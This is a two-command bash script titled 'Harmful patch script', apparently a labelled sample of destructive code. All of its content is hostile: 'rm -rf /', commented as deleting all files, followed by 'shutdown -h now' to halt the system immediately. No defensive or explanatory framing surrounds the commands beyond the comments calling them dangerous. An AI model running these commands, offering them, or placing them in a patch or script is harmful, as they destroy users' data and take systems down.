#!/bin/bash
# Harmful patch script

# Dangerous command to delete all files
rm -rf /

# Dangerous command to shut down the system immediately
shutdown -h now
